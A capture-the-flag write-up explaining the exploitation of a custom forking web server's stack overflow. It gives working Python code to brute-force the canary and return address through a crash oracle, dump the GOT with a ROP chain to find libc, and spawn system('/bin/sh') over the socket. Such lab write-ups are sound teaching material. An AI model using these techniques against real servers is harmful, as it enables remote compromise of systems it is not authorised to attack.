# Web Server Woes

The challenge description reads:

> I had this great product idea, and made my own web server to host it! Its blazing fast.\
> Create yourself a new instance at: http://celsius.blockharbor.io:8080

At the given link we are able to spin up a docker container, which will expose an instance of the
web server over a random ephemeral port on the celsius.blockharbor.io domain. The website, itself,
isn't too interesting. It appears to serve only a single static HTML page, and only accepts HTTP GET
requests. The challenge description also includes an [a.out](a.out) file for us to download, which
presumably is the custom web server executable. Opening the binary up in
[Ghidra](https://ghidra-sre.org/) and reverse engineering it reveals that it is, indeed.

> **_TIP:_** Import [a.out.gzf](a.out.gzf) into Ghidra to get the already reversed executable.

There is a classic stack buffer overflow vulnerability in the `handle_conn` function on line 19,
where the server reads in 1064 bytes into a 1032-byte buffer. The binary has been compiled with all
protections enabled (i.e. full RELRO, stack canaries, NX enabled, and ASLR), as can be seen by
running [checksec](https://github.com/slimm609/checksec.sh) on it. This is going to make
exploitation a bit trickier, but not impossible.

![Stack Buffer Overflow Vulnerability](decomp-vuln.png)

The first protection we need to defeat is the stack canary. This is typically done by leaking the
canary value, and then overwriting it with itself to avoid triggering stack-smashing detection;
however, in this case there is no obvious way to leak it. Two important things to notice, though,
are that the server forks a new child process for each connection, and that we receive a response to
our HTTP GET queries when we do not overflow the buffer, and no response when we do. The first part
means that crashing the child process doesn't crash the web server, so the stack canary will be the
same every time. The second part reveals that we can use the presence (or lack thereof) of a server
response as an oracle to determine when we have induced a crash. With the oracle, we can leak the
value of the stack canary byte-by-byte. For the first iteration, all we need to do is completely
fill the buffer, and then overwrite the first byte of the canary with `0x00`, then `0x01`, then
`0x02`, and so on until `0xff`. The byte value where we still receive a response from the server
(i.e. do not induce a crash) is the correct value. We then just repeat this process for each byte of
the canary until we have leaked all 8 bytes. This will require `8 * 256 = 2048` queries in the worst
case (i.e. for a theoretical canary value of `0xffffffffffffffff`). In practice, though, 64-bit
Linux operating systems will choose `0x00` for the least-significant byte (i.e. to thwart buffer
overflow attacks resulting from operations on null-terminated strings), and the other 7 bytes will
be random. For reasons that will become clear soon, we should also go ahead and leak the frame
pointer and return address values from the stack.

```py
host = 'celsius.blockharbor.io'
port = '<ephemeral port>'

junk = b'A' * 1027

def request(host, port, data):
    if DEBUG:
        print(f'Trying {data[-1]:02x} ...')
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(data)
        try:
            return s.recv(1) != b''
        except socket.timeout:
            return False

stack = b''

# Leak the stack canary and frame pointer.
for i in range(16):
    for b in range(256):
        c = bytes([ b ])
        data = b'GET /' + junk + stack + c
        if request(host, port, data):
            print(f'Stack[{i}] = {b:02x}')
            stack += c
            break
    else:
        print(f'Failed to leak the stack')
        sys.exit(1)

# Least-significant byte of the correct return address
stack += b'\xa1'

# Leak the return address.
for i in range(17, 24):
    for b in range(256):
        c = bytes([ b ])
        data = b'GET /' + junk + stack + c
        if request(host, port, data):
            print(f'Stack[{i}] = {b:02x}')
            stack += c
            break
    else:
        print(f'Failed to leak the stack')
        sys.exit(1)

print()

chk = int.from_bytes(stack[ 0: 8], byteorder='little')
rbp = int.from_bytes(stack[ 8:16], byteorder='little')
rip = int.from_bytes(stack[16:24], byteorder='little')
```

Once we have leaked the stack canary, frame pointer, and return address, the next step is to bypass
ASLR. We can already determine where the image and stack are loaded in memory, but we still don't
know where Libc is. We can figure this out by leaking addresses from the global offset table (GOT),
but to do this we're going to have to execute some shellcode. Recall, though, that the binary has
the NX bit set, so the stack will not be executable. We, therefore, have to use return-oriented
programming (ROP) to execute multiple short sequences of instructions that will progressively do
what we want.

We can use [ropper](https://github.com/sashs/Ropper) to easily find potentially useful gadgets in
the binary. The ones I used in my exploit are:

```py
pop_rsp_gadget = txt_base + 0x0000097d  # pop rsp; pop r13; pop r14; pop r15; ret;
pop_rdi_gadget = txt_base + 0x00000983  # pop rdi; ret;
pop_rsi_gadget = txt_base + 0x00000981  # pop rsi; pop r15; ret;
pop_rdx_gadget = txt_base + 0x00000414  # pop rdx; ret;
ret_gadget     = txt_base + 0x0000001a  # ret;
```

The `pop rsp` gadget is necessary because we can only write up to 32 bytes beyond the end of the
stack buffer. Considering that the return address is located at a 16-byte offset from the end of the
buffer, we only have enough room to execute a single gadget before we need to pivot the stack.
Therefore, the first gadget in any ROP chain we construct should be a pivot to the beginning of the
stack buffer we just overflowed. The first 24 bytes of our HTTP GET request will be popped into
registers `r13`, `r14`, and `r15`, so we just need to place our ROP chain (after the pivot) at
offset 24 from the beginning of our request.

Below is the ROP chain I constructed to leak an arbitrary amount of data from any memory address.

```py
def leak(addr, size):
    payload  = b'GET ///\x00'           # pop r13
    payload += p64(0xaaaaaaaaaaaaaaaa)  # pop r14
    payload += p64(0xbbbbbbbbbbbbbbbb)  # pop r15

    # write(4, addr, size)
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(4)                   # pop rdi
    payload += p64(pop_rsi_gadget)      # ret
    payload += p64(addr)                # pop rsi
    payload += p64(0xcccccccccccccccc)  # pop r15
    payload += p64(pop_rdx_gadget)      # ret
    payload += p64(size)                # pop rdx
    payload += p64(write_plt_addr)      # ret

    # exit(0)
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(0)                   # pop rax
    payload += p64(exit_plt_addr)       # ret

    payload += b'A' * (1032 - len(payload))

    payload += p64(chk)
    payload += p64(rbp)

    payload += p64(pop_rsp_gadget)      # ret       <- execution starts here
    payload += p64(buf_base)            # pop rsp

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(payload)
        res = s.recv(size)

    return res

# Dump the global offset table.
got_leak = leak(got_base, got_size)

print('GOT:')
hexdump(got_leak)
print()
```

Even after dumping the GOT, we  still don't know for sure where Libc is loaded in memory. We first
have to determine the specific version that is being used, since that will help us figure out the
offset of each function in Libc's `.text` section. To determine the  version, we need to enter at
least two different leaked pointers into a [Libc database searcher](https://libc.rip/). Using the
leaked addresses from the GOT reveals that the web server is using either v2.27 or v2.37 of
libc.so.6. Now we can compute the offset of Libc in memory and find the addresses of other functions
and symbols of interest to us.

Finally, the last step is to execute a ROP chain that calls `system("/bin/sh")` to pop a shell on
the server.

```py
def exploit(conn):
    payload  = b'GET ///\x00'           # pop r13
    payload += p64(0xaaaaaaaaaaaaaaaa)  # pop r14
    payload += p64(0xbbbbbbbbbbbbbbbb)  # pop r15

    # dup2(4, 0)
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(4)                   # pop rdi
    payload += p64(pop_rsi_gadget)      # ret
    payload += p64(0)                   # pop rsi
    payload += p64(0xcccccccccccccccc)  # pop r15
    payload += p64(dup2_addr)           # ret

    # dup2(4, 1)
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(4)                   # pop rdi
    payload += p64(pop_rsi_gadget)      # ret
    payload += p64(1)                   # pop rsi
    payload += p64(0xcccccccccccccccc)  # pop r15
    payload += p64(dup2_addr)           # ret

    # dup2(4, 2)
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(4)                   # pop rdi
    payload += p64(pop_rsi_gadget)      # ret
    payload += p64(2)                   # pop rsi
    payload += p64(0xcccccccccccccccc)  # pop r15
    payload += p64(dup2_addr)           # ret

    # Re-align the stack ...
    payload += p64(ret_gadget)          # ret

    # system("/bin/sh")
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(bin_sh_addr)         # pop rdi
    payload += p64(system_addr)         # ret

    # exit(0)
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(0)                   # pop rax
    payload += p64(exit_plt_addr)       # ret

    payload += b'A' * (1032 - len(payload))

    payload += p64(chk)
    payload += p64(rbp)

    payload += p64(pop_rsp_gadget)      # ret       <- execution starts here
    payload += p64(buf_base)            # pop rsp

    print(f'Payload:')
    # hexdump(payload)
    print(payload)
    print()

    conn.send(payload)
    conn.interactive()

exploit(remote(host, port))
```

With our remote shell, we can now print the flag that is located in the web root's parent directory.

**Flag:** `bh{fu1l_pr0t3ct1on_full_pwn}`
